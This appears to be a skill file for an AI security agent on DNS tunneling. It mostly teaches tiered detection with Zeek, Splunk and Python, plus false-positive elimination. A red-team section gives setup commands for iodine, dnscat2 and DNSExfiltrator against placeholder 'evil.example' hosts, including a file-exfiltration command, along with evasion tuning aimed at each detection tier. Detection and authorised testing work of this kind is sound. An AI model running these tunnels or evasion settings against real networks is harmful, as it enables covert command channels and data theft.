---
name: dns-tunneling-detection
description: Detect and execute DNS tunneling for C2 and data exfiltration — tiered detection methodology, attacker evasion techniques, offensive tool configuration, and false positive elimination
origin: Vigil
---

# DNS Tunneling Detection

> **`vigil assess kali` audit flags:** use `--technique RECON`; this skill's offensive side operates against in-scope DNS infrastructure, so `RECON` fits better than `OSINT` (which is passive external-zone lookups).

## Adversarial Context

Attackers use DNS tunneling when HTTPS C2 is blocked or monitored. DNS is chosen because it is almost never blocked outbound, resolvers are usually allowed through firewalls, and most security teams only monitor HTTP/S. Detection must account for evasion: sophisticated tools use low-frequency queries, short labels, and legitimate-looking domain patterns to blend in. A detection strategy built on static thresholds (entropy > 3.5, query length > 50) will catch only the noisiest tunnels and miss everything purpose-built to evade.

## When to Activate

- Investigating potential data exfiltration channels where HTTP/S egress is monitored or blocked
- Anomalous DNS traffic patterns flagged by network monitoring
- Zeek/Suricata/Arkime DNS logs available for deep analysis
- Hunting for C2 communication over DNS (iodine, dnscat2, DNSExfiltrator, Cobalt Strike DNS)
- Red team engagement requiring DNS-based C2 or exfiltration setup and evasion tuning

## Tools

- Zeek (DNS log analysis — `dns.log` fields: `query`, `qtype_name`, `answers`, `rcode_name`, `ts`)
- tshark (packet-level DNS inspection — response sizes, EDNS, TCP fallback)
- Splunk/ELK for log correlation and alerting
- Python (entropy calculation, timing analysis, statistical modeling)
- iodine / dnscat2 / DNSExfiltrator (offensive tooling — see Offensive section)

---

## Attacker Evasion Techniques

Understanding what makes basic detection fail is prerequisite to building detection that works.

### Slow-Drip Exfiltration
**Defeats:** Volume-based detection, burst alerts.
One query per minute carrying 30 bytes of encoded data. At that rate, exfiltrating 1 MB takes ~23 days — but credentials, API keys, and session tokens fit in a few queries. Most SIEM alerting windows are 5-15 minutes; a query every 60 seconds never triggers volume thresholds.

### Short Label Encoding
**Defeats:** Length-based detection (subdomain > 50 chars).
Hex-encode data in 8-character chunks: `a1b2c3d4.tunnel.evil.example`. Subdomain length is 8 characters — well within normal DNS patterns. Base32 with padding stripped keeps labels under 15 characters while encoding 10 bytes per label.

### Legitimate Cloud DNS Resolvers
**Defeats:** Destination-based detection (blocklists, geo-anomaly).
Route tunnel traffic through `8.8.8.8`, `1.1.1.1`, or corporate DNS resolvers that recursively resolve to the attacker's authoritative nameserver. The client never directly contacts the C2 domain's nameserver — all traffic goes to the same resolver the network already trusts.

### CNAME/A Record Tunneling with Short Responses
**Defeats:** Record-type detection (TXT-heavy = suspicious).
iodine uses CNAME records by default. Cobalt Strike DNS beacon uses A records where the 4-byte IP address IS the encoded response. Neither triggers TXT-record alerting. Response sizes stay under 512 bytes, avoiding TCP fallback that some detectors key on.

### Domain Generation Algorithms (DGA) vs Fixed C2 Domain
**Requires different detection strategies.** DGA-based tunneling rotates the parent domain daily — domain reputation and blocklists cannot keep up. Fixed C2 domains accumulate reputation signals over time but are vulnerable to domain-based blocking. Detection must handle both: behavioral analysis for DGA, reputation + volume for fixed domains.

### Encoding Variation
**Defeats:** Pattern-matching on base64/hex character sets.
Custom alphabets, compression before encoding, or using dictionary words as encoding (each word maps to a byte value) produce subdomains that look like legitimate hostnames: `update-service-check.cdn.evil.example`.

---

## Tiered Detection Methodology

### Tier 1: Known Tunnel Tool Signatures (Easy Wins)

Catch the tools people actually use before tuning them. These signatures detect default configurations — sophisticated operators will modify them, which is why Tier 1 alone is insufficient.

| Tool | Default Signature | Detection Query |
|------|------------------|-----------------|
| iodine | CNAME/NULL queries to single domain, predictable 100-200 byte response size, query prefix pattern `[a-z0-9]{5,}\.` to fixed parent | `qtype_name IN ("CNAME","NULL") AND unique_subdomains_per_parent > 20 in 5min` |
| dnscat2 | TXT queries with hex-encoded subdomains (`[0-9a-f]+\.`), regular 1-5 second interval, NXDOMAIN responses mixed with valid | `qtype_name == "TXT" AND subdomain MATCHES "^[0-9a-f]{16,}\."` |
| DNSExfiltrator | Long TXT queries (>40 char subdomains), base64url character set (`[A-Za-z0-9_-]+`), sequential numbering in subdomain prefix | `qtype_name == "TXT" AND subdomain_length > 40 AND base64url_charset_ratio > 0.95` |
| Cobalt Strike DNS | A record queries at configurable beacon interval (default 60s), very short subdomains (8-12 chars), encoded 4-byte IP responses | `qtype_name == "A" AND query_interval_stddev < 2s AND unique_subdomains > 50/hour to same parent` |

```bash
# Zeek: detect dnscat2 hex pattern
cat dns.log | zeek-cut query qtype_name | awk '$2 == "TXT"' | \
  awk -F. '{print $1}' | grep -cE '^[0-9a-f]{16,}$'
# >0 hits with sustained volume to one parent domain = dnscat2 default config

# Zeek: detect iodine NULL/CNAME concentration
cat dns.log | zeek-cut query qtype_name | awk '$2 == "NULL" || $2 == "CNAME"' | \
  awk -F. '{for(i=2;i<=NF;i++) printf "%s.", $i; print ""}' | sort | uniq -c | sort -rn | head 10
# Single parent domain with 100+ NULL/CNAME queries = iodine candidate
```

### Tier 2: Statistical Analysis WITH Context

Raw entropy thresholds produce floods of false positives. The key insight: **compare entropy and length against the baseline for THAT network, not against absolute thresholds.**

**Step 1: Build a per-network baseline (run once, update weekly)**
```python
import math
from collections import defaultdict

def subdomain_entropy(query):
    """Extract subdomain (everything before the registered domain) and compute Shannon entropy."""
    parts = query.rstrip('.').split('.')
    if len(parts) < 3:
        return 0.0
    subdomain = '.'.join(parts[:-2])
    if not subdomain:
        return 0.0
    freq = {}
    for c in subdomain:
        freq[c] = freq.get(c, 0) + 1
    length = len(subdomain)
    return -sum((f/length) * math.log2(f/length) for f in freq.values())

def build_baseline(dns_log_path):
    """Parse Zeek dns.log, compute per-parent-domain entropy distribution."""
    baselines = defaultdict(list)  # parent_domain -> [entropy values]
    with open(dns_log_path) as f:
        for line in f:
            if line.startswith('#'):
                continue
            fields = line.strip().split('\t')
            if len(fields) < 10:
                continue
            query = fields[9]  # Zeek dns.log field 9 = query
            parts = query.rstrip('.').split('.')
            if len(parts) < 3:
                continue
            parent = '.'.join(parts[-2:])
            ent = subdomain_entropy(query)
            baselines[parent].append(ent)
    # Compute mean + stddev per parent
    results = {}
    for parent, values in baselines.items():
        if len(values) < 10:
            continue
        mean = sum(values) / len(values)
        variance = sum((v - mean) ** 2 for v in values) / len(values)
        stddev = variance ** 0.5
        results[parent] = {'mean': mean, 'stddev': stddev, 'count': len(values)}
    return results
```

**Step 2: Flag queries where entropy exceeds THAT domain's baseline by >2 standard deviations**

This catches tunneling to `legit-looking.evil.example` (whose subdomains suddenly have high entropy) without flagging CDN domains that naturally have high-entropy subdomains (e.g., `a]kf92.cloudfront.net`).

**Step 3: Cross-reference with subdomain uniqueness ratio**
```
unique_subdomains / total_queries to that parent domain
```
- Normal domains (google.com, microsoft.com): ratio < 0.3 (many repeated queries like `www`, `mail`, `dns`)
- Tunnel domains: ratio > 0.8 (nearly every query has a unique subdomain because data is encoded in labels)

### Tier 3: Behavioral Analysis

Statistical anomalies need behavioral context to separate tunneling from noisy-but-legitimate traffic.

**New domain + high query volume + no prior resolution history = suspicious**

- [ ] Check if the parent domain appeared in DNS logs before the current window — tunneling domains are often freshly registered or previously unseen on the network
- [ ] Check domain age via WHOIS — domains <30 days old with high query volume from a single host warrant investigation
- [ ] Check if any other host on the network queries this domain — tunneling typically originates from a single compromised host, while legitimate services are queried by many hosts
- [ ] Check query timing distribution — human browsing produces irregular timing; tunnels produce regular intervals (even when jittered, the distribution is tighter than human behavior)

```bash
# Zeek: single-source domains (queried by only 1 internal host)
cat dns.log | zeek-cut id.orig_h query | \
  awk -F. '{q=$(NF-1)"."$NF; print $1, q}' | \
  sort -u | awk '{print $2}' | sort | uniq -c | \
  awk '$1 == 1 {print $2}'
# Cross-reference with Tier 2 high-entropy domains
```

**Query-response size correlation:**
- Normal DNS: query size varies, response size varies independently
- Tunneling: query sizes cluster (fixed chunk encoding) and response sizes correlate with query content

### Tier 4: Advanced Features for ML/Hunting

When manual tiers are insufficient, these features separate tunneling from legitimate traffic in practice:

1. **Query timing regularity** — Compute coefficient of variation (stddev/mean) of inter-query intervals per parent domain. Tunnels: CV < 0.3 (regular beaconing). Human browsing: CV > 1.0 (bursty, irregular).
2. **Response size distribution** — Tunnels that carry downstream data show bimodal response sizes (small keepalives + larger data responses). Normal DNS shows unimodal distribution around 50-200 bytes.
3. **Subdomain character set** — Base64 uses `[A-Za-z0-9+/=]`, hex uses `[0-9a-f]`, base32 uses `[A-Z2-7=]`. Character set uniformity within subdomains to one parent domain (measured by chi-squared against expected charset) distinguishes encoding from natural language hostnames.
4. **Query-to-response ratio** — Exfiltration: large queries, small responses (data flows out). C2: small queries, larger responses (commands flow in). Bidirectional tunnels: both large. Normal DNS: small queries, small-to-medium responses.
5. **NXDOMAIN ratio** — Some tunnel implementations generate NXDOMAIN responses during negotiation or when the server is unreachable. An elevated NXDOMAIN ratio to a single parent domain (>20%) with continued querying is abnormal — legitimate clients back off after NXDOMAIN.

---

## Offensive DNS Tunneling (Red Team)

### iodine Setup
```bash
# Server (attacker infrastructure — requires authoritative NS delegation)
# Delegate a subdomain: tunnel.evil.example NS -> attacker_server_ip
iodine-server -f -c -P 'tunnel_password' -u nobody tunnel.evil.example

# Client (compromised host)
iodine -f -P 'tunnel_password' tunnel.evil.example
# Creates a tun0 interface — full IP tunnel over DNS
# Default: CNAME/NULL records, ~100 KB/s throughput
```

**Evasion tuning for iodine:**
- `-T CNAME` — force CNAME only (avoids NULL record detection in Tier 1)
- `-O raw` — use raw encoding instead of base64 (different character distribution)
- `-L0` — disable lazy mode (slower but less predictable timing)
- Set MTU low (`-m 200`) to keep individual query labels short

### dnscat2 Setup
```bash
# Server
dnscat2-server --dns "domain=c2.evil.example" --no-cache

# Client
dnscat2 --dns "domain=c2.evil.example" --no-cache
# Provides encrypted command channel over DNS TXT records
```

**Evasion tuning for dnscat2:**
- `--max-retransmits 1` — reduces retry patterns that fingerprint the tool
- `--delay 5000` — 5-second delay between queries (defeats burst detection)
- Recompile with custom hex alphabet to defeat `[0-9a-f]` pattern matching

### DNSExfiltrator Usage
```powershell
# Exfiltrate a file (PowerShell — common in Windows post-exploitation)
Invoke-DNSExfiltrator -FilePath C:\secrets\data.zip -DomainName exfil.evil.example `
  -Delay 500 -RequestsPerBurst 3

# Server receives and reassembles
python3 dnsexfiltrator_server.py -d exfil.evil.example
```

**Evasion tuning for DNSExfiltrator:**
- Increase `-Delay` to 2000+ ms (defeats volume-based detection)
- Reduce `-RequestsPerBurst` to 1 (defeats burst detection)
- Use `-Encoding hex` with 8-char chunks (keeps subdomain labels short — defeats Tier 1 length signature)

### Evasion Configuration Summary

| Detection Tier | Evasion Approach |
|---------------|-----------------|
| Tier 1 (tool signatures) | Change record types, modify encoding alphabet, adjust default intervals |
| Tier 2 (statistical) | Short labels, dictionary-word encoding, match target network's entropy baseline |
| Tier 3 (behavioral) | Use aged domains, spread queries across multiple parent domains, add jitter >30% CV |
| Tier 4 (ML features) | Randomize chunk sizes, vary response sizes with padding, mimic human browsing timing patterns |

---

## Detection Queries (Tuned for Production)

### Zeek

```bash
# Top queried domains by unique subdomain count — primary tunnel indicator
cat dns.log | zeek-cut query | awk -F. '{print $(NF-1)"."$NF}' | \
  sort | uniq -c | sort -rn | head 20
# FALSE POSITIVE RATE: Medium. CDN domains (cloudfront, akamaized) will appear.
# TUNING: Exclude domains in your CDN allowlist. Focus on domains NOT in Alexa/Tranco top 1M.

# Single-source high-volume domains (one host, many queries)
cat dns.log | zeek-cut id.orig_h query | \
  awk -F. '{parent=$(NF-1)"."$NF; print $1"\t"parent}' | \
  sort | uniq | awk '{print $2}' | sort | uniq -c | \
  awk '$1 <= 2 {print $2}' > single_source_domains.txt
# Then cross-reference with high-volume:
cat dns.log | zeek-cut query | awk -F. '{print $(NF-1)"."$NF}' | \
  sort | uniq -c | sort -rn | grep -Ff single_source_domains.txt
# FALSE POSITIVE RATE: Low. Legitimate services are queried by many hosts.

# TXT record concentration per domain
cat dns.log | zeek-cut qtype_name query | awk '$1 == "TXT"' | \
  awk -F. '{print $(NF-1)"."$NF}' | sort | uniq -c | sort -rn | head 20
# FALSE POSITIVE RATE: Medium. DKIM/SPF verification generates legitimate TXT lookups.
# TUNING: Exclude known mail domains and _dmarc/_dkim prefixed queries.

# Long subdomains (>30 chars — lower threshold than naive 50 to catch short-label evasion)
cat dns.log | zeek-cut query | \
  awk -F. '{sub_len=0; for(i=1;i<NF-1;i++) sub_len+=length($i)+1; if(sub_len>30) print sub_len, $0}' | \
  sort -rn | head 50
# FALSE POSITIVE RATE: High at 30-char threshold. Use only as Tier 2 input, not standalone alert.
```

### Splunk

```spl
# Tier 1+2 combined: high unique subdomain count + entropy scoring
index=dns
| eval subdomain=mvindex(split(query,"."),0)
| eval parent_domain=mvindex(split(query,"."),-2) . "." . mvindex(split(query,"."),-1)
| eval sub_len=len(subdomain)
| stats count AS total_queries dc(subdomain) AS unique_subs values(qtype_name) AS qtypes BY src_ip parent_domain
| eval uniqueness_ratio=unique_subs/total_queries
| where unique_subs > 20 AND uniqueness_ratio > 0.7
| sort - unique_subs
```
**FALSE POSITIVE RATE:** Low-medium. High uniqueness ratio is the strongest single indicator.
**TUNING:** Add `| where NOT match(parent_domain, "cloudfront\.net|akamaized\.net|googleapis\.com")` for your CDN allowlist.

```spl
# Tier 3: new domains with high query volume from single source
index=dns earliest=-24h
| eval parent_domain=mvindex(split(query,"."),-2) . "." . mvindex(split(query,"."),-1)
| stats count AS queries dc(src_ip) AS unique_sources first(_time) AS first_seen BY parent_domain
| where unique_sources <= 2 AND queries > 50
| lookup domain_age_lookup domain AS parent_domain OUTPUT first_seen_network
| where isnull(first_seen_network) OR first_seen_network > relative_time(now(), "-7d")
| sort - queries
```

---

## What Triggers False Positives (and How to Eliminate Them)

### CDN Health Checks and DNS-Heavy Services
- **Pattern:** High query volume, many unique subdomains (cache-busted URLs), single source
- **Why it looks like tunneling:** Hits Tier 2 (high uniqueness ratio) and Tier 3 (high volume from few sources)
- **Differentiation:** CDN domains are in Tranco/Alexa top 10K. Response record types are A/AAAA (not TXT/NULL). Query timing is irregular (event-driven, not beaconing)

### DKIM/SPF/DMARC Lookups
- **Pattern:** Long TXT record queries (`_dmarc.domain.com`, `selector._domainkey.domain.com`)
- **Why it looks like tunneling:** TXT record type + long query strings trigger Tier 1 TXT-based rules
- **Differentiation:** Query prefix is `_dmarc` or `_domainkey` — static pattern, trivial to allowlist. Volume correlates with inbound email volume, not exfiltration activity

### SaaS Applications with DNS-Heavy Auth
- **Pattern:** Microsoft 365 generates DNS queries for `autodiscover.domain.com`, `_sip._tls.domain.com`, `lyncdiscover.domain.com`, plus TXT queries for federation verification
- **Why it looks like tunneling:** Many unique subdomains to Microsoft-owned domains, TXT records, regular intervals (scheduled auth checks)
- **Differentiation:** Parent domains are `microsoft.com`, `office.com`, `microsoftonline.com` — known-good. Multiple internal hosts query the same domains (tunneling is usually single-source)

### Anti-Virus and Endpoint Security Products
- **Pattern:** EDR/AV products perform frequent DNS lookups for reputation checking — high volume, unique subdomains (file hashes encoded in queries)
- **Why it looks like tunneling:** High entropy subdomains (hash values), regular intervals, high volume from every endpoint
- **Differentiation:** Queries come from ALL endpoints (not one compromised host). Parent domains are vendor-specific (e.g., `avts.mcafee.com`, `api.crowdstrike.com`). Consistent across the fleet.

---

## What to Record

- Source IP, destination resolver, and whether the resolver is the network's configured DNS server or an external resolver (direct-to-external = additional indicator)
- Parent domain receiving tunneled queries + domain registration age
- Subdomain entropy values relative to network baseline (not absolute) + sample queries
- Record type distribution with comparison to network norms
- Query volume, time window, and timing regularity (coefficient of variation)
- Uniqueness ratio (unique subdomains / total queries)
- Matched tool signature or evasion indicators
- Detection tier that triggered the investigation and tiers that confirmed/denied
- False positive assessment with specific differentiating evidence

## Kill Signals — Stop Hunting When
- Tier 1 signature match found (known tool pattern) → HIGH confidence, record as intelligence finding, escalate to operator
- Tier 2-3 anomalies found but all resolve to legitimate services (CDN, DKIM, SaaS) after false positive elimination → no tunneling, move on
- No DNS logs available via `vigil assess kali exec --technique LOG-READ --intent "<why>" --probe-kind fingerprint --phase <phase> --timeout 30 -- ...` or Splunk → cannot perform this analysis, skip skill entirely
- Tunnel confirmed with C2 domain identified → record finding, provide domain IOC to operator for firewall blocking

## Escalate When
- A single internal host shows a sustained uplift in query volume for one domain (>3x baseline) AND the queries are predominantly TXT, NULL, CNAME, or oversized A — volume alone is noise, the record-type mix is the tunneling signature, pivot to entropy and subdomain-cardinality analysis
- Subdomain labels under a single parent show high Shannon entropy (>3.5) OR base32/base64/hex character-class distribution across many unique labels — encoded payloads look random, run per-label entropy and character-class scoring before false-positive-eliminating
- A domain is newly observed in the window (<30 days since first query), resolves from a cheap/free registrar, or has a single NS delegation — newly-registered tunneling infrastructure is the common pattern, pivot to WHOIS and passive-DNS for age and reputation
- Query timing shows regular periodicity (beacon cadence of tens of seconds to minutes, low jitter) from a single source — human and CDN traffic is bursty, beacons are metronomic, run autocorrelation on inter-arrival times
- Short TXT/NULL responses correlate in volume with outbound query volume from the same host (bidirectional byte-count roughly balanced) — one-way queries are exfiltration, balanced volumes are interactive C2, escalate severity when the pattern is interactive

## Extended Resources

- `agent/references/offensive-tactics/frp-tunneling.md` -- tunnel exposure for DNS C2 callback infrastructure
- `agent/references/runtime-guides/engagement-methodology.md` -- where DNS tunnel hunting fits in engagement phases
